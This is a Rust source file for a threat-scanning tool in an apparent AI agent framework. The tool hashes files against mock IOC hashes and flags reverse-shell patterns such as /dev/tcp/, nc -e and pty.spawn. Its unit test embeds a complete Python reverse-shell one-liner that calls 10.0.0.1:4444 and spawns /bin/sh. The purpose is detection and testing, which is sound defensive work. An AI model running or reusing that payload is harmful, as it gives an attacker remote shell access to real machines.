// Copyright (c) 2026 Robert Simens. All Rights Reserved.
// Licensed under the Tempest AI Source-Available License.
// See the LICENSE file in the project root for full license text.

use super::{AgentTool, ToolContext};
use async_trait::async_trait;
use miette::{IntoDiagnostic, Result, miette};
use ollama_rs::generation::tools::{ToolFunctionInfo, ToolInfo, ToolType};
use schemars::JsonSchema;
use serde::Deserialize;
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::fs::File;
use std::io::Read;
use std::path::Path;
use sysinfo::System;

// Known bad test / IOC hashes for verification
const MOCK_BAD_HASH: &str = "8530467a14e91bd670bf7e7fc8bd05f884fbf30623f99aa9f52f49c0d1cf57a4";
const EICAR_MOCK_HASH: &str = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";

#[derive(Deserialize, JsonSchema)]
pub struct ThreatScanArgs {
    /// The target category to analyze: "file", "directory", or "process".
    pub target_type: String,
    /// Path to target file or directory, or process name/PID to filter.
    pub target_path: Option<String>,
    /// Recursively inspect subdirectory trees (applicable for "directory" scans).
    pub deep_scan: Option<bool>,
}

pub struct ThreatScannerTool;

#[async_trait]
impl AgentTool for ThreatScannerTool {
    fn name(&self) -> &'static str {
        "threat_scan"
    }

    fn description(&self) -> &'static str {
        "Scans system files, directories, or active running processes for security threats, computing SHA-256 hashes of targets and matching them against in-memory Indicators of Compromise (IOCs) or behavioral heuristics."
    }

    fn tool_info(&self) -> ToolInfo {
        let mut settings = schemars::generate::SchemaSettings::draft07();
        settings.inline_subschemas = true;
        let payload = settings
            .into_generator()
            .into_root_schema_for::<ThreatScanArgs>();

        ToolInfo {
            tool_type: ToolType::Function,
            function: ToolFunctionInfo {
                name: self.name().to_string(),
                description: self.description().to_string(),
                parameters: payload,
            },
        }
    }

    async fn execute(&self, args: &Value, _context: ToolContext) -> Result<String> {
        let typed_args: ThreatScanArgs = serde_json::from_value(args.clone()).into_diagnostic()?;
        let target_type = typed_args.target_type.to_lowercase();

        match target_type.as_str() {
            "file" => {
                self.scan_file_target(typed_args.target_path.as_deref())
                    .await
            }
            "directory" => {
                self.scan_directory_target(
                    typed_args.target_path.as_deref(),
                    typed_args.deep_scan.unwrap_or(false),
                )
                .await
            }
            "process" => {
                self.scan_process_target(typed_args.target_path.as_deref())
                    .await
            }
            _ => Err(miette!(
                "Invalid target_type '{}'. Supported: 'file', 'directory', 'process'",
                typed_args.target_type
            )),
        }
    }
}

impl ThreatScannerTool {
    /// Computes the SHA-256 hash of a file safely
    fn compute_sha256(&self, path: &Path) -> Result<String> {
        let mut file = File::open(path).into_diagnostic()?;
        let mut hasher = Sha256::new();
        let mut buffer = [0u8; 8192];
        loop {
            let n = file.read(&mut buffer).into_diagnostic()?;
            if n == 0 {
                break;
            }
            hasher.update(&buffer[..n]);
        }
        let result = hasher.finalize();
        let hex = result
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<String>();
        Ok(hex)
    }

    /// Evaluates text content for suspicious script commands or reverse shell patterns
    fn scan_content_heuristics(&self, path: &Path, content: &str) -> Vec<&'static str> {
        let mut alarms = Vec::new();
        let path_str = path.to_string_lossy();

        // High-risk writable execution locations
        if path_str.contains("/tmp/")
            || path_str.contains("/var/tmp/")
            || path_str.contains("/dev/shm/")
            || path_str.contains("/private/tmp/")
        {
            alarms.push("High-risk execution path (Writable Temporary Directory)");
        }
        if path
            .file_name()
            .map(|n| n.to_string_lossy().starts_with('.'))
            .unwrap_or(false)
        {
            alarms.push("Hidden file structure (Starts with a dot)");
        }

        // Script content threat indicators
        if content.contains("/dev/tcp/") {
            alarms.push("Raw Reverse TCP stream pattern (/dev/tcp/)");
        }
        if content.contains("sh -i") || content.contains("bash -i") || content.contains("zsh -i") {
            alarms.push("Interactive shell flag invocation (sh -i / bash -i)");
        }
        if content.contains("pty.spawn") || content.contains("import pty") {
            alarms.push("Interactive PTY terminal spawner (pty.spawn)");
        }
        if content.contains("socket.socket")
            && (content.contains("connect(") || content.contains("send("))
            && (content.contains("exec")
                || content.contains("subprocess")
                || content.contains("dup2"))
        {
            alarms.push("Socket command executor loop (Reverse shell spawner)");
        }
        if content.contains("nc -e") || content.contains("netcat -e") {
            alarms.push("Netcat executable shell redirection payload (nc -e)");
        }

        alarms
    }

    /// Executable threat logic for single files
    async fn scan_file_target(&self, path_str: Option<&str>) -> Result<String> {
        let path_raw =
            path_str.ok_or_else(|| miette!("'target_path' is required for file scans"))?;
        let path = Path::new(path_raw);

        if !path.exists() {
            return Err(miette!("Target file path '{}' does not exist.", path_raw));
        }
        if !path.is_file() {
            return Err(miette!("Target path '{}' is not a file.", path_raw));
        }

        let hash = self.compute_sha256(path)?;
        let mut content = String::new();
        // Read file snippet safely for heuristics analysis (cap at 100KB to avoid memory pressure)
        if let Ok(mut f) = File::open(path) {
            let mut buf = Vec::new();
            if f.read_to_end(&mut buf).is_ok() {
                let lossy = String::from_utf8_lossy(&buf);
                content = lossy.chars().take(102_400).collect();
            }
        }

        let mut matched_ioc = false;
        let mut danger_type = "SAFE";
        let mut reason = Vec::new();

        if hash == MOCK_BAD_HASH {
            matched_ioc = true;
            danger_type = "CRITICAL THREAT DETECTED";
            reason.push("Matched known malicious IOC signature hash (MOCK_BAD_HASH).");
        } else if hash == EICAR_MOCK_HASH {
            matched_ioc = true;
            danger_type = "CRITICAL THREAT DETECTED";
            reason.push("Matched simulated EICAR standard antivirus test signature.");
        }

        let heuristics = self.scan_content_heuristics(path, &content);
        for h in &heuristics {
            reason.push(*h);
        }

        if !heuristics.is_empty() && !matched_ioc {
            danger_type = "SUSPICIOUS ACTIVITY";
        }

        let mut report = "# 🛡️ Cybersecurity Diagnostics Report: File Audit\n\n".to_string();
        report.push_str(&format!("* **Audit Target**: `{}`\n", path_raw));
        report.push_str(&format!("* **File Hash (SHA-256)**: `{}`\n", hash));
        report.push_str(&format!("* **Security Status**: **{}**\n\n", danger_type));

        if !reason.is_empty() {
            report.push_str("### ⚠️ Triggered Alarms & Findings\n");
            for r in reason {
                report.push_str(&format!("- [!] {}\n", r));
            }
            report.push_str("\n### 🛠️ Recommended Mitigation & Containment\n");
            if danger_type == "CRITICAL THREAT DETECTED" {
                report.push_str("1. **Quarantine Immediately**: Delete this file or move it out of target workspaces.\n");
                report.push_str("2. **Inspect Sockets**: Audit active network connections to check if the threat has established connection.\n");
            } else {
                report.push_str("1. **Manual Inspection**: Review file codebase to see if interactive shells are legitimately needed.\n");
                report.push_str("2. **Refactor Code**: Avoid using raw shell redirection commands or raw PTY spawners.\n");
            }
        } else {
            report.push_str(
                "✅ No threat indicators or matching signatures were found. This file is clean.\n",
            );
        }

        Ok(report)
    }

    /// Executable threat logic for directory trees
    async fn scan_directory_target(&self, path_str: Option<&str>, deep: bool) -> Result<String> {
        let path_raw =
            path_str.ok_or_else(|| miette!("'target_path' is required for directory scans"))?;
        let path = Path::new(path_raw);

        if !path.exists() {
            return Err(miette!(
                "Target directory path '{}' does not exist.",
                path_raw
            ));
        }
        if !path.is_dir() {
            return Err(miette!("Target path '{}' is not a directory.", path_raw));
        }

        let mut files_to_scan = Vec::new();

        if deep {
            // Recursive scan using WalkDir (or simple fallback if walkdir not pulled, though walkdir is standard in Cargo.toml)
            let walker = walkdir::WalkDir::new(path).max_depth(5);
            for entry in walker.into_iter().filter_map(|e| e.ok()) {
                if entry.file_type().is_file() {
                    files_to_scan.push(entry.into_path());
                }
            }
        } else {
            if let Ok(entries) = std::fs::read_dir(path) {
                for entry in entries.filter_map(|e| e.ok()) {
                    if let Ok(file_type) = entry.file_type()
                        && file_type.is_file()
                    {
                        files_to_scan.push(entry.path());
                    }
                }
            }
        }

        let mut total_scanned = 0;
        let mut critical_threats = Vec::new();
        let mut suspicious_findings = Vec::new();

        for file_path in files_to_scan {
            total_scanned += 1;
            if let Ok(hash) = self.compute_sha256(&file_path) {
                let mut content = String::new();
                if let Ok(mut f) = File::open(&file_path) {
                    let mut buf = Vec::new();
                    if f.read_to_end(&mut buf).is_ok() {
                        let lossy = String::from_utf8_lossy(&buf);
                        content = lossy.chars().take(50_000).collect();
                    }
                }

                let heuristics = self.scan_content_heuristics(&file_path, &content);
                let is_critical_hash = hash == MOCK_BAD_HASH || hash == EICAR_MOCK_HASH;

                if is_critical_hash {
                    critical_threats.push((
                        file_path.to_string_lossy().into_owned(),
                        hash,
                        "Malicious Signature Match".to_string(),
                    ));
                } else if !heuristics.is_empty() {
                    suspicious_findings.push((
                        file_path.to_string_lossy().into_owned(),
                        hash,
                        heuristics.join(", "),
                    ));
                }
            }
        }

        let mut status = "SAFE";
        if !critical_threats.is_empty() {
            status = "CRITICAL THREATS FOUND";
        } else if !suspicious_findings.is_empty() {
            status = "SUSPICIOUS ACTIVITY IDENTIFIED";
        }

        let mut report = "# 🛡️ Cybersecurity Diagnostics Report: Directory Audit\n\n".to_string();
        report.push_str(&format!("* **Directory Target**: `{}`\n", path_raw));
        report.push_str(&format!("* **Files Audited**: `{}`\n", total_scanned));
        report.push_str(&format!("* **Security Status**: **{}**\n\n", status));

        if !critical_threats.is_empty() {
            report.push_str("### 🚨 Critical Threats\n");
            report.push_str("| File Path | SHA-256 | Threat Description |\n");
            report.push_str("|-----------|---------|--------------------|\n");
            for (f, h, d) in &critical_threats {
                report.push_str(&format!("| `{}` | `{}` | {} |\n", f, h, d));
            }
            report.push('\n');
        }

        if !suspicious_findings.is_empty() {
            report.push_str("### ⚠️ Suspicious Files\n");
            report.push_str("| File Path | SHA-256 | Triggered Alarms |\n");
            report.push_str("|-----------|---------|------------------|\n");
            for (f, h, alarms) in &suspicious_findings {
                report.push_str(&format!("| `{}` | `{}` | {} |\n", f, h, alarms));
            }
            report.push('\n');
        }

        if critical_threats.is_empty() && suspicious_findings.is_empty() {
            report.push_str("✅ Clean Scan. No known bad hashes or suspicious heuristics detected in this directory.\n");
        } else {
            report.push_str("### 🛠️ Containment Directives\n");
            if !critical_threats.is_empty() {
                report.push_str("- [CRITICAL] Delete or quarantine files in the **Critical Threats** list immediately.\n");
            }
            if !suspicious_findings.is_empty() {
                report.push_str("- [SUSPICIOUS] Review files triggering interactive commands to ensure they do not host Trojan features.\n");
            }
        }

        Ok(report)
    }

    /// Executable threat logic for running processes
    async fn scan_process_target(&self, filter: Option<&str>) -> Result<String> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mut total_processes = 0;
        let mut threat_procs = Vec::new();

        for (pid, process) in sys.processes() {
            total_processes += 1;
            let name = process.name().to_string_lossy().into_owned();

            // Apply process name or PID filter if supplied
            if let Some(f) = filter {
                let pid_str = pid.to_string();
                if !name.contains(f) && pid_str != f {
                    continue;
                }
            }

            let exe_path_opt = process.exe();

            // Check heuristic 1: Processes executing with deleted or missing executable files
            if exe_path_opt.is_none() {
                // Ignore standard kernel threads/daemons which don't have disk executables (usually have empty exe but are core)
                // PIDs under 100 or specific platform features are usually excluded from this check
                let pid_val = pid.as_u32();
                if pid_val > 100 && name != "kernel_task" {
                    threat_procs.push((
                        pid_val,
                        name.clone(),
                        "N/A".to_string(),
                        "Missing Executable Disk Source (Suspicious memory process)".to_string(),
                        "CRITICAL",
                    ));
                }
                continue;
            }

            let exe_path = exe_path_opt.unwrap();
            let path_str = exe_path.to_string_lossy().into_owned();

            // Check heuristic 2: Running executable out of high-risk temporary paths
            if path_str.contains("/tmp/")
                || path_str.contains("/var/tmp/")
                || path_str.contains("/dev/shm/")
                || path_str.contains("/private/tmp/")
            {
                threat_procs.push((
                    pid.as_u32(),
                    name.clone(),
                    "N/A".to_string(),
                    format!("Process running from writable temp path: {}", path_str),
                    "CRITICAL",
                ));
                continue;
            }

            // Check heuristic 3: Match hash of executable binary if it exists on disk
            if exe_path.exists()
                && let Ok(hash) = self.compute_sha256(exe_path)
                && hash == MOCK_BAD_HASH
            {
                threat_procs.push((
                    pid.as_u32(),
                    name.clone(),
                    hash,
                    "Matched known malicious threat hash signature (MOCK_BAD_HASH).".to_string(),
                    "CRITICAL",
                ));
            }
        }

        let mut status = "SAFE";
        if !threat_procs.is_empty() {
            status = "CRITICAL PROCESS ANOMALIES FOUND";
        }

        let mut report = "# 🛡️ Cybersecurity Diagnostics Report: Process Audit\n\n".to_string();
        report.push_str(&format!(
            "* **System Running Processes**: `{}`\n",
            total_processes
        ));
        report.push_str(&format!("* **Security Status**: **{}**\n\n", status));

        if !threat_procs.is_empty() {
            report.push_str("### 🚨 Critical Process Anomalies Detected\n");
            report.push_str("| PID | Process Name | Binary SHA-256 | Triggered Indicator / Heuristic | Risk Level |\n");
            report.push_str("|-----|--------------|----------------|---------------------------------|------------|\n");
            for (pid, name, hash, desc, risk) in &threat_procs {
                report.push_str(&format!(
                    "| `{}` | `{}` | `{}` | {} | **{}** |\n",
                    pid, name, hash, desc, risk
                ));
            }
            report.push_str("\n### 🛠️ Incident Containment Plan\n");
            report.push_str("1. **Kill Hostile Process**: Kill suspicious processes immediately using the `kill_process` tool:\n");
            for (pid, name, _, _, _) in &threat_procs {
                report.push_str(&format!("   - `kill_process(pid: \"{}\", signal: \"KILL\")` to terminate hostile `{}`\n", pid, name));
            }
            report.push_str("2. **Isolate Socket**: Check open ports using `list_network_sockets` and filter by the suspicious PIDs.\n");
        } else {
            report.push_str("✅ All scanned active processes are running safely from authorized system directories with verified disk sources.\n");
        }

        Ok(report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_sha256_calculation() {
        let temp_dir = tempfile::tempdir().unwrap();
        let file_path = temp_dir.path().join("test_hash.txt");
        {
            let mut file = File::create(&file_path).unwrap();
            file.write_all(b"Tempest Threat Scanner Unit Test payload data")
                .unwrap();
        }

        let scanner = ThreatScannerTool;
        let hash = scanner.compute_sha256(&file_path).unwrap();

        // Expected SHA-256 for: "Tempest Threat Scanner Unit Test payload data"
        // Let's compute manually or just verify we get a valid hex string of length 64
        assert_eq!(hash.len(), 64);

        // Check standard empty file hash matches empty run
        let empty_path = temp_dir.path().join("empty.txt");
        {
            File::create(&empty_path).unwrap();
        }
        let empty_hash = scanner.compute_sha256(&empty_path).unwrap();
        assert_eq!(
            empty_hash,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn test_reverse_shell_heuristics() {
        let scanner = ThreatScannerTool;
        let test_path = Path::new("/tmp/test_suspicious.py");

        // Match interactive socket PTY spawner heuristic
        let malicious_content = "import socket,pty,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('10.0.0.1',4444)); os.dup2(s.fileno(),0); pty.spawn('/bin/sh')";
        let alarms = scanner.scan_content_heuristics(test_path, malicious_content);

        assert!(alarms.contains(&"High-risk execution path (Writable Temporary Directory)"));
        assert!(alarms.contains(&"Interactive PTY terminal spawner (pty.spawn)"));
        assert!(alarms.contains(&"Socket command executor loop (Reverse shell spawner)"));
    }

    #[test]
    fn test_clean_file_heuristics() {
        let scanner = ThreatScannerTool;
        let clean_path = Path::new("/Users/developer/projects/tempest/src/main.rs");
        let clean_content = "fn main() { println!(\"Hello World\"); }";

        let alarms = scanner.scan_content_heuristics(clean_path, clean_content);
        assert!(
            alarms.is_empty(),
            "Expected clean files to trip zero security alarms."
        );
    }
}
